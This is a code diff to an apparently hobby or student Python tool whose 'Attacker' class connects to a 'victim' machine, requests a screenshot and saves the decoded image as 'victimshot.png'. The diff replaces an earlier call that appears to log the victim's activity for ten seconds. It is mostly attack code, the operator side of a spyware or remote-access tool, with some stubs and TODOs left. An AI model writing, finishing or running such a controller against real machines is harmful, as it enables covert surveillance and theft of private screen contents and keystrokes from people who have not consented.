@@ -7,6 +7,9 @@ from dataclasses import dataclass
 from typing import Optional
 from clientExceptions import *
 import os
+from PIL import Image
+import io
+import base64
 
 SHELL_ARGUMENTS = sys.argv
 
@@ -17,19 +20,28 @@ TARGET_PORT = 5000 if len(SHELL_ARGUMENTS) < 3 else SHELL_ARGUMENTS[2]
 SOCK_BYTE_LIMIT = 4096
 
 
-class FileFromBytes:
+# Convert Base64 to Image
+def b64_2_img(data):
+    buff = io.BytesIO(base64.b64decode(data))
+    return Image.open(buff)
+
+
+class FileBuilder:
 
     @staticmethod
     def image_from_bytes(path: str, bytes_content: bytes):
-        pass
+        with open(path, 'wb') as text_file:
+            text_file.write(bytes_content)
 
     @staticmethod
     def text_from_bytes(path: str, bytes_content: bytes):
-        pass
+        with open(path, 'wb') as image_file:
+            image_file.write(bytes_content)
 
     @staticmethod
     def json_from_bytes(path: str, bytes_content: bytes):
-        pass
+        with open(path, 'wb') as json_file:
+            json_file.write(bytes_content)
 
 
 @dataclass
@@ -45,33 +57,22 @@ class Response:
     bytes_content: bytes
     info: ResponseInfo
 
-    def build_file(self):
-        pass
-
 
 @dataclass
 class JSONResponse(Response):
     content: str
     dictionary: dict
 
-    def build_file(self):
-        pass
-
 
 @dataclass
 class TextResponse(Response):
     content: str
 
-    def build_file(self):
-        pass
-
 
 @dataclass
 class ImageResponse(Response):
-    path:str
-
-    def build_file(self):
-        pass
+    path: str
+    save: bool = True
 
 
 class Attacker:
@@ -120,8 +121,10 @@ class Attacker:
 
         return response_obj
 
-    def _build_image_response(self, response_bytes:bytes, response_info:ResponseInfo, path:str=""):
-        pass
+    def _build_image_response(self, response_bytes: bytes, response_info: ResponseInfo, path: str = None, save=True):
+        if path is None:
+            path = "victim_screenshot.png"
+        return ImageResponse(status='success', bytes_content=response_bytes, info=response_info, path=path, save=save)
 
     def receive_and_process(self):
         preparation_response_bytes = self.receive()
@@ -131,8 +134,9 @@ class Attacker:
             response_obj = self._build_json_response(response_bytes=response_bytes, response_info=response_info)
         elif response_info.content_type == 'text':
             response_obj = self._build_text_respnose(response_bytes=response_bytes, response_info=response_info)
-        elif response_info.content_type == 'image': # TODO: implement image
-            response_obj = self._build_image_response(response_bytes=response_bytes, response_info=response_info, path=os.getcwd())
+        elif "image" in response_info.content_type:  # TODO: implement image
+            response_obj = self._build_image_response(response_bytes=response_bytes, response_info=response_info,
+                                                      path=os.getcwd())
         else:
             raise ServerInvalidContentType()
         self.process_response(response_obj)
@@ -177,13 +181,20 @@ class Attacker:
         pass
 
     def process_image_success(self, response: ImageResponse):
-        pass
+        print("processing an image...")
+        if response.save:
+            print(response.bytes_content)
+            #FileBuilder.image_from_bytes("victim_screenshot.png", response.bytes_content)
+            my_image = b64_2_img(response.bytes_content)
+            my_image.save("victimshot.png")
+            print("created an image successfully")
+        else:
+            pass
 
     def process_image_failure(self, response: ImageResponse):
         pass
 
     def process_response(self, response: Response):
-        print(response)
         if isinstance(response, JSONResponse):
             print("processing a json response")
             if response.status == 'success':  # the message was successful.
@@ -248,7 +259,7 @@ class Attacker:
 def main():
     attacker = Attacker()
     attacker.connect()
-    attacker.log_for(10)
+    attacker.request_screenshot()
     attacker.receive_and_process()
     attacker.close()
 
